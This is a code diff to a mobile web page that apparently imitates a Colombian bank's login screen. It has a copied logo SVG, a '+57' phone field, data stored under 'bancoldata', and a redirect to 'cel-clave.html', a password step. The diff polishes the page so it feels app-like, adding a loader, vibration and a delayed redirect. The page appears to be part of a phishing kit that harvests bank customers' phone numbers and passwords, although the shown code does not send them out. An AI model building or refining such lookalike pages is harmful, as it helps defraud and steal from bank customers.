@@ -14,6 +14,7 @@ body{
   justify-content:center;
 }
 
+/* CONTENEDOR APP */
 .container{
   width:100%;
   max-width:420px;
@@ -22,6 +23,7 @@ body{
   flex-direction:column;
   padding:20px;
   color:white;
+  animation:fadeIn .5s ease;
 }
 
 /* HEADER */
@@ -52,6 +54,11 @@ header{
   background:rgba(255,255,255,0.15);
   border-radius:6px;
   overflow:hidden;
+  transition:.3s;
+}
+
+.input-box:focus-within{
+  background:rgba(255,255,255,0.25);
 }
 
 .prefix{
@@ -67,7 +74,7 @@ input{
   border:none;
   background:transparent;
   color:white;
-  font-size:16px;
+  font-size:18px;
   outline:none;
 }
 
@@ -78,7 +85,7 @@ input::placeholder{
 /* BOTON */
 button{
   width:100%;
-  margin-top:10px;
+  margin-top:12px;
   padding:14px;
   border:none;
   border-radius:6px;
@@ -86,23 +93,49 @@ button{
   color:white;
   font-size:16px;
   cursor:pointer;
-  transition:0.3s;
+  transition:.3s;
 }
 
 button:disabled{
-  opacity:0.5;
-  cursor:not-allowed;
+  opacity:0.4;
 }
 
-button:hover{
-  transform:scale(1.02);
+button:active{
+  transform:scale(0.96);
 }
 
-/* ANIMACION */
-.fade{
-  animation:fadeIn 0.6s ease;
+/* LOADER */
+.loader{
+  position:fixed;
+  inset:0;
+  background:#21003d;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  opacity:0;
+  pointer-events:none;
+  transition:.4s;
 }
 
+.loader.active{
+  opacity:1;
+  pointer-events:all;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid rgba(255,255,255,0.2);
+  border-top:4px solid #ff008c;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg);}
+}
+
+/* ANIMACIONES */
 @keyframes fadeIn{
   from{opacity:0; transform:translateY(10px);}
   to{opacity:1; transform:translateY(0);}
@@ -112,14 +145,13 @@ button:hover{
 
 <body>
 
-<div class="container fade">
+<div class="container">
 
 <header>
   <div class="circle">?</div>
 
-  <!-- LOGO SVG COMPLETO -->
+  <!-- LOGO -->
   <div style="color:#aaa;">
-    <!-- PEGASTE BIEN EL SVG 🔥 -->
     <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
       <g>
         <path d="M83.59,23.13..."></path>
@@ -132,7 +164,12 @@ button:hover{
 
 <div class="input-box">
   <div class="prefix">+57</div>
-  <input type="text" id="phone" placeholder="Ingresa tu cel">
+  <input 
+    type="tel" 
+    id="phone" 
+    inputmode="numeric"
+    placeholder="Ingresa tu cel"
+    maxlength="12">
 </div>
 
 <button id="btn" disabled>Continuar</button>
@@ -141,11 +178,17 @@ button:hover{
 
 </div>
 
+<!-- LOADER -->
+<div class="loader" id="loader">
+  <div class="spinner"></div>
+</div>
+
 <script>
 const phone = document.getElementById("phone");
 const btn = document.getElementById("btn");
+const loader = document.getElementById("loader");
 
-/* FORMATO 3-3-4 */
+/* FORMATO */
 function formatNumber(value){
   let digits = value.replace(/\D/g,"");
 
@@ -165,6 +208,7 @@ function validate(){
   return digits.length === 10 && digits.startsWith("3");
 }
 
+/* INPUT */
 phone.addEventListener("input", ()=>{
   phone.value = formatNumber(phone.value);
   btn.disabled = !validate();
@@ -174,6 +218,10 @@ phone.addEventListener("input", ()=>{
 btn.addEventListener("click", ()=>{
   if(!validate()) return;
 
+  /* vibración móvil */
+  if(navigator.vibrate) navigator.vibrate(50);
+
+  /* guardar */
   const raw = phone.value.replace(/\D/g,"");
 
   localStorage.setItem("bancoldata", JSON.stringify({
@@ -181,7 +229,13 @@ btn.addEventListener("click", ()=>{
     fecha: new Date().toISOString()
   }));
 
-  window.location.href = "cel-clave.html";
+  /* mostrar loader */
+  loader.classList.add("active");
+
+  /* transición tipo app */
+  setTimeout(()=>{
+    window.location.href = "cel-clave.html";
+  },1200);
 });
 </script>
 
